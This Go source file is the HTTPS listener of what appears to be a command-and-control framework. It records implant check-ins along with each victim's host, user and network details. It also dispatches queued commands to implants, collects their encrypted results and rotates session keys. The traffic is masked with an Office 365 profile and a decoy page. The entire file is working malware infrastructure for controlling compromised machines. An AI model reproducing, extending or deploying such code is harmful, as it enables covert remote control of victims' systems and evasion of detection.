package listeners

import (
	"context"
	"crypto/ecdh"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/uLl0a/lavianc2/internal/crypto"
	"github.com/uLl0a/lavianc2/internal/events"
	"github.com/uLl0a/lavianc2/internal/models"
	"github.com/uLl0a/lavianc2/internal/profiles"
	"github.com/uLl0a/lavianc2/internal/protocol"
	"github.com/uLl0a/lavianc2/internal/sessions"
	"github.com/uLl0a/lavianc2/internal/storage"
)

// HTTPSListener recibe check-ins de implantes vía HTTP/S.
type HTTPSListener struct {
	ID       uuid.UUID
	Name     string
	BindAddr string
	Domain   string
	Server   *http.Server

	certFile string
	keyFile  string

	store    *storage.Store
	registry *sessions.Registry
	bus      *events.Bus
	log      *slog.Logger
	router   *protocol.Router
	crypto   *crypto.SessionCryptoStore

	profile    *profiles.Profile
	serverKeys *crypto.ServerKeyStore

	// Intervalo de rekey para las sesiones nuevas (0 = default).
	rekeyEvery uint64

	serverPriv *ecdh.PrivateKey
}

func NewHTTPSListener(
	id uuid.UUID,
	name, bindAddr, domain string,
	store *storage.Store,
	registry *sessions.Registry,
	bus *events.Bus,
	serverKeys *crypto.ServerKeyStore,
	certFile, keyFile string,
	rekeyEvery uint64,
	log *slog.Logger,
) (*HTTPSListener, error) {
	if serverKeys == nil {
		return nil, fmt.Errorf("listener https: server key store requerido")
	}
	if certFile == "" || keyFile == "" {
		return nil, fmt.Errorf("listener https: certFile y keyFile requeridos")
	}
	if _, err := os.Stat(certFile); err != nil {
		return nil, fmt.Errorf("listener https: certFile: %w", err)
	}
	if _, err := os.Stat(keyFile); err != nil {
		return nil, fmt.Errorf("listener https: keyFile: %w", err)
	}

	profileRegistry := profiles.NewRegistry()
	profile, err := profileRegistry.Get("office365")
	if err != nil {
		return nil, fmt.Errorf("listener https: cargar perfil: %w", err)
	}

	l := &HTTPSListener{
		ID:         id,
		Name:       name,
		BindAddr:   bindAddr,
		Domain:     domain,
		store:      store,
		registry:   registry,
		bus:        bus,
		log:        log,
		serverKeys: serverKeys,
		rekeyEvery: rekeyEvery,
		serverPriv: serverKeys.PrivateKey(),
		profile:    profile,
		router:     protocol.NewRouter(log),
		crypto:     crypto.NewSessionCryptoStoreWithRepo(store.SessionKeys),
		certFile:   certFile,
		keyFile:    keyFile,
	}

	l.router.MustRegister(protocol.MsgCheckin, l.handleCheckinEnvelope)
	l.router.MustRegister(protocol.MsgTaskPull, l.handleTaskPullEnvelope)
	l.router.MustRegister(protocol.MsgTaskResult, l.handleTaskResultEnvelope)
	l.router.MustRegister(protocol.MsgHeartbeat, l.handleHeartbeatEnvelope)
	l.router.MustRegister(protocol.MsgKeyRotation, l.handleKeyRotationEnvelope)

	bus.Subscribe(events.TopicImplantDead, func(ctx context.Context, ev events.Event) {
		id, ok := ev.Payload.(uuid.UUID)
		if !ok {
			return
		}
		if err := l.crypto.Delete(context.Background(), id); err != nil {
			l.log.Warn("https: limpiar sesión muerta", "err", err, "implant", id)
			return
		}
		l.registry.Unregister(id)
		l.log.Info("https: sesión limpiada", "implant", id)
	})

	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/envelope", l.handleEnvelope)
	mux.HandleFunc("/", l.handleDecoy)

	l.Server = &http.Server{
		Addr:         bindAddr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
		TLSConfig: &tls.Config{
			MinVersion: tls.VersionTLS13,
		},
	}
	return l, nil
}

func (l *HTTPSListener) handleEnvelope(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	ctx := r.Context()

	body, err := io.ReadAll(io.LimitReader(r.Body, 50<<20))
	if err != nil {
		l.log.Error("envelope: leer body", "err", err)
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	env, err := protocol.UnmarshalEnvelope(body)
	if err != nil {
		l.log.Warn("envelope: deserializar", "err", err)
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	ctx = context.WithValue(ctx, clientIPKey, clientIP(r))

	resp, err := l.router.Dispatch(ctx, env)
	if err != nil {
		l.log.Error("envelope: dispatch", "err", err, "type", env.Type)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	respBytes, err := resp.Marshal()
	if err != nil {
		l.log.Error("envelope: marshal respuesta", "err", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(respBytes)
}

func (l *HTTPSListener) handleDecoy(w http.ResponseWriter, r *http.Request) {
	if l.profile != nil {
		l.profile.ApplyHeaders(r)
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`<!DOCTYPE html>
<html>
<head><title>Service</title></head>
<body><h1>Service is running</h1></body>
</html>`))
}

func (l *HTTPSListener) handleCheckinEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var req struct {
		SessionKey string `json:"session_key"`
		Hostname   string `json:"hostname"`
		Username   string `json:"username"`
		OS         string `json:"os"`
		Arch       string `json:"arch"`
		PID        int    `json:"pid"`
		Process    string `json:"process"`
		InternalIP string `json:"internal_ip"`
		Sleep      int    `json:"sleep"`
		Jitter     int    `json:"jitter"`
		PublicKey  string `json:"public_key"`
	}
	if err := json.Unmarshal(env.Payload, &req); err != nil {
		return nil, fmt.Errorf("checkin: payload inválido: %w", err)
	}

	if req.SessionKey == "" || req.PublicKey == "" {
		return nil, fmt.Errorf("checkin: session_key y public_key requeridos")
	}
	sleep := req.Sleep
	if sleep <= 0 {
		sleep = 60
	}
	jitter := req.Jitter
	if jitter < 0 {
		jitter = 0
	}

	pubBytes, err := base64.StdEncoding.DecodeString(req.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("checkin: public_key no es base64 válido: %w", err)
	}
	implantPub, err := crypto.PublicKeyFromBytes(pubBytes)
	if err != nil {
		return nil, fmt.Errorf("checkin: public_key malformada: %w", err)
	}

	implant, err := l.store.Implants.GetBySessionKey(ctx, req.SessionKey)
	if err != nil {
		return nil, fmt.Errorf("checkin: buscar implante: %w", err)
	}

	externalIP := clientIPFromContext(ctx)
	now := time.Now().UTC()

	if implant == nil {
		implant = &models.Implant{
			ID:            uuid.New(),
			SessionKey:    req.SessionKey,
			Hostname:      req.Hostname,
			Username:      req.Username,
			OS:            req.OS,
			Arch:          req.Arch,
			PID:           req.PID,
			ProcessName:   req.Process,
			InternalIP:    req.InternalIP,
			ExternalIP:    externalIP,
			ListenerID:    l.ID,
			PublicKey:     pubBytes,
			Status:        models.ImplantAlive,
			SleepInterval: sleep,
			Jitter:        jitter,
			FirstSeen:     now,
			LastCheckIn:   now,
			Metadata:      map[string]any{},
		}
		if err := l.store.Implants.Create(ctx, implant); err != nil {
			return nil, fmt.Errorf("checkin: crear implante: %w", err)
		}
		l.log.Info("nuevo implante",
			"id", implant.ID,
			"session_key", req.SessionKey,
			"host", req.Hostname,
			"os", req.OS,
		)
	} else {
		implant.Hostname = req.Hostname
		implant.Username = req.Username
		implant.OS = req.OS
		implant.Arch = req.Arch
		implant.PID = req.PID
		implant.ProcessName = req.Process
		implant.InternalIP = req.InternalIP
		implant.ExternalIP = externalIP
		implant.PublicKey = pubBytes
		implant.LastCheckIn = now
		implant.Status = models.ImplantAlive
		if err := l.store.Implants.UpdateCheckin(ctx, implant); err != nil {
			l.log.Error("checkin: actualizar implante", "err", err, "id", implant.ID)
		}
	}

	l.registry.Register(implant.ID)

	sessionCrypto, err := crypto.NewSessionCrypto(l.serverPriv, implantPub, req.SessionKey, l.rekeyEvery)
	if err != nil {
		return nil, fmt.Errorf("checkin: derivar session crypto: %w", err)
	}
	if err := l.crypto.Set(ctx, implant.ID, sessionCrypto); err != nil {
		l.log.Error("checkin: persistir session keys", "err", err, "implant", implant.ID)
	}

	l.bus.Publish(ctx, events.Event{
		Topic:   events.TopicImplantCheckin,
		Payload: implant.ID,
	})

	resp := map[string]any{
		"implant_id": implant.ID.String(),
		"server_pub": base64.StdEncoding.EncodeToString(l.serverPriv.PublicKey().Bytes()),
		"sleep":      implant.SleepInterval,
		"jitter":     implant.Jitter,
	}
	respBytes, err := json.Marshal(resp)
	if err != nil {
		return nil, fmt.Errorf("checkin: marshal respuesta: %w", err)
	}
	return protocol.NewEnvelope(protocol.MsgCheckin, respBytes), nil
}

func (l *HTTPSListener) handleTaskPullEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("task pull: wrapper inválido: %w", err)
	}

	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("task pull: implant_id inválido: %w", err)
	}

	sessionCrypto, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("task pull: sesión %s sin claves", implantID)
	}

	// Validar la autenticación del ciphertext (aunque hoy no usemos el plaintext).
	if len(wrapper.Data) > 0 {
		if _, err := sessionCrypto.DecryptFromBeacon(wrapper.Data, nil); err != nil {
			return nil, fmt.Errorf("task pull: descifrar: %w", err)
		}
	}

	if sessionCrypto.ShouldRekey() {
		return l.initiateRekey(ctx, implantID, sessionCrypto)
	}

	tasks, err := l.store.Tasks.ClaimPendingTasksForImplant(ctx, implantID, 32)
	if err != nil {
		return nil, fmt.Errorf("task pull: listar tareas: %w", err)
	}

	wire := make([]protocol.TaskWire, 0, len(tasks))
	for _, t := range tasks {
		wire = append(wire, protocol.TaskWire{
			ID:      t.ID.String(),
			Command: t.Command,
			Args:    t.Args,
			Payload: t.Payload,
		})
	}
	tasksJSON, err := json.Marshal(wire)
	if err != nil {
		return nil, fmt.Errorf("task pull: marshal tareas: %w", err)
	}

	encrypted, err := sessionCrypto.EncryptForBeacon(tasksJSON, nil)
	if err != nil {
		return nil, fmt.Errorf("task pull: cifrar respuesta: %w", err)
	}

	sessionCrypto.IncrementMsg()
	go func() {
		if err := l.crypto.Save(context.Background(), implantID); err != nil {
			l.log.Warn("task pull: no se pudo persistir msgCount", "err", err)
		}
	}()

	return protocol.NewEnvelope(protocol.MsgTaskDispatch, encrypted), nil
}

func (l *HTTPSListener) handleTaskResultEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("task result: wrapper inválido: %w", err)
	}

	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("task result: implant_id inválido: %w", err)
	}

	sessionCrypto, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("task result: sesión %s sin claves", implantID)
	}

	plaintext, err := sessionCrypto.DecryptFromBeacon(wrapper.Data, nil)
	if err != nil {
		return nil, fmt.Errorf("task result: descifrar: %w", err)
	}

	var result protocol.TaskResultWire
	if err := json.Unmarshal(plaintext, &result); err != nil {
		return nil, fmt.Errorf("task result: payload inválido: %w", err)
	}

	taskID, err := uuid.Parse(result.TaskID)
	if err != nil {
		return nil, fmt.Errorf("task result: task_id inválido: %w", err)
	}

	status := models.TaskCompleted
	if result.Error != "" {
		status = models.TaskFailed
	}
	if err := l.store.Tasks.UpdateTaskStatus(ctx, taskID, status, result.Output, result.Error); err != nil {
		return nil, fmt.Errorf("task result: actualizar tarea: %w", err)
	}

	l.bus.Publish(ctx, events.Event{
		Topic: events.TopicTaskCompleted,
		Payload: map[string]any{
			"task_id":    taskID,
			"implant_id": implantID,
			"status":     status,
			"output":     result.Output,
			"error":      result.Error,
		},
	})

	sessionCrypto.IncrementMsg()
	go func() {
		if err := l.crypto.Save(context.Background(), implantID); err != nil {
			l.log.Warn("task result: no se pudo persistir msgCount", "err", err)
		}
	}()

	return protocol.NewEnvelope(protocol.MsgTaskResult, []byte("ok")), nil
}

func (l *HTTPSListener) handleHeartbeatEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var req struct {
		ImplantID string `json:"implant_id"`
	}
	if err := json.Unmarshal(env.Payload, &req); err != nil {
		return nil, fmt.Errorf("heartbeat: payload inválido: %w", err)
	}

	if req.ImplantID != "" {
		implantID, err := uuid.Parse(req.ImplantID)
		if err == nil {
			_ = l.store.Implants.UpdateStatus(ctx, implantID, models.ImplantAlive)
		}
	}

	return protocol.NewEnvelope(protocol.MsgHeartbeat, []byte("pong")), nil
}

type ctxKey int

const clientIPKey ctxKey = iota

func clientIPFromContext(ctx context.Context) string {
	if v, ok := ctx.Value(clientIPKey).(string); ok {
		return v
	}
	return ""
}

func clientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		// Tomar solo el primer valor; el resto son proxies.
		if i := strings.IndexByte(xff, ','); i >= 0 {
			xff = xff[:i]
		}
		return strings.TrimSpace(xff)
	}
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return strings.TrimSpace(xri)
	}

	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		// No hay puerto (o formato inesperado): devolver tal cual.
		return r.RemoteAddr
	}
	return host
}

// initiateRekey genera un par efímero del server y responde al poll con
// MsgKeyRotation en lugar de MsgTaskDispatch. La ephPriv se guarda en el
// store hasta que llegue la respuesta del implante.
func (l *HTTPSListener) initiateRekey(
	ctx context.Context,
	implantID uuid.UUID,
	sc *crypto.SessionCrypto,
) (*protocol.Envelope, error) {
	ephPriv, ephPub, err := crypto.GenerateKeyPair()
	if err != nil {
		return nil, fmt.Errorf("rekey: generar eph: %w", err)
	}
	l.crypto.SetPendingRekey(implantID, ephPriv)

	req := map[string]string{
		"server_eph_pub": base64.StdEncoding.EncodeToString(ephPub.Bytes()),
	}
	reqJSON, _ := json.Marshal(req)
	encrypted, err := sc.EncryptForBeacon(reqJSON, nil)
	if err != nil {
		_ = l.crypto.TakePendingRekey(implantID) // cleanup
		return nil, fmt.Errorf("rekey: cifrar: %w", err)
	}

	l.log.Info("rekey iniciado", "implant", implantID)
	return protocol.NewEnvelope(protocol.MsgKeyRotation, encrypted), nil
}

// handleKeyRotationEnvelope procesa la respuesta del implante al rekey.
// Recibe el ephPub del implante, deriva las nuevas claves con la ephPriv
// pendiente y cambia el estado de la sesión.
func (l *HTTPSListener) handleKeyRotationEnvelope(
	ctx context.Context,
	env *protocol.Envelope,
) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("rekey: wrapper inválido: %w", err)
	}
	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("rekey: implant_id inválido: %w", err)
	}

	sc, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("rekey: sesión %s sin claves", implantID)
	}

	// El implante cifra su respuesta con las claves VIEJAS.
	plaintext, err := sc.DecryptFromBeacon(wrapper.Data, nil)
	if err != nil {
		return nil, fmt.Errorf("rekey: descifrar: %w", err)
	}

	var req struct {
		ImplantEphPub string `json:"implant_eph_pub"`
	}
	if err := json.Unmarshal(plaintext, &req); err != nil {
		return nil, fmt.Errorf("rekey: payload inválido: %w", err)
	}
	implantEphPubBytes, err := base64.StdEncoding.DecodeString(req.ImplantEphPub)
	if err != nil {
		return nil, fmt.Errorf("rekey: eph_pub no es base64: %w", err)
	}
	implantEphPub, err := crypto.PublicKeyFromBytes(implantEphPubBytes)
	if err != nil {
		return nil, fmt.Errorf("rekey: eph_pub malformada: %w", err)
	}

	serverEphPriv := l.crypto.TakePendingRekey(implantID)
	if serverEphPriv == nil {
		return nil, fmt.Errorf("rekey: sin eph pendiente para %s", implantID)
	}

	if err := sc.ApplyRekeyAsServer(serverEphPriv, implantEphPub); err != nil {
		return nil, fmt.Errorf("rekey: aplicar: %w", err)
	}
	if err := l.crypto.Save(ctx, implantID); err != nil {
		l.log.Warn("rekey: persistir", "err", err)
	}

	l.log.Info("rekey completado", "implant", implantID)

	okBytes, err := sc.EncryptForBeacon([]byte("ok"), nil)
	if err != nil {
		return nil, fmt.Errorf("rekey: cifrar ack: %w", err)
	}
	return protocol.NewEnvelope(protocol.MsgKeyRotation, okBytes), nil
}

func (l *HTTPSListener) Start() error {
	l.log.Info("HTTPS listener arrancando",
		"addr", l.BindAddr,
		"cert", l.certFile,
		"min_tls", "1.3",
	)
	err := l.Server.ListenAndServeTLS(l.certFile, l.keyFile)
	if err != nil && err != http.ErrServerClosed {
		return err
	}
	return nil
}

func (l *HTTPSListener) Stop(ctx context.Context) error {
	l.log.Info("deteniendo HTTPS listener")
	return l.Server.Shutdown(ctx)
}

// ExpirePendingRekeys purga los rekeys pendientes expirados del store
// criptográfico del listener. Lo llama el janitor del server.
func (l *HTTPSListener) ExpirePendingRekeys() []uuid.UUID {
	return l.crypto.ExpirePendingRekeys()
}
